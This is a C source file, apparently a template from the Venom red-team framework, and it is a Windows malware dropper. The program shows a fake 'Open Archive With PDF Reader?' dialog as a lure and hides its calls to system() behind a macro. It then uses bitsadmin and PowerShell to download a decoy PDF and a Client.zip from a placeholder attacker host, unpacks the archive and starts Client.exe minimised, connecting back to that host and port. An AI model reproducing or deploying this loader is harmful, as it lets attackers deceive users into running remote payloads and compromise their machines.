/*
Author: r00t-3xp10it (SSA RedTeam @2020)
Framework: Venom v1.0.17.5 - shinigami
*/

#include<stdio.h>
#include<stdlib.h>
#include<winsock2.h>
#include<windows.h>

#define _____(d,y,i,o,q,h)(i##d##h##y##o##q)
#define _ _____(y,t,s,e,m,s)

int main()
{
   MessageBox(NULL, "Open Archive With PDF Reader?", "Portable Document Format (PDF)", MB_YESNO | MB_ICONQUESTION | MB_DEFBUTTON1 | MB_SETFOREGROUND);
   _("powershell -w 1 bitsadmin /tRaNsFeR googlestore /dOwNlOaD /priority foreground http://LhOsT/FiLNaMe.pdf FiNaL\\FiLNaMe.pdf && powershell Start-Process -windowstyle hidden -FilePath 'TempDir\\FiLNaMe.pdf'");
   _("powershell -w 1 bitsadmin /tRaNsFeR microsoft /dOwNlOaD /priority foreground http://LhOsT/Client.zip FiNaL\\Client.zip && powershell Expand-Archive -Force FiNaL\\Client.zip FiNaL");Sleep(1);
   _("cd TempDir && cmd /R start /min Client.exe ip=LhOsT port=LpOrT");
   return 0;
}

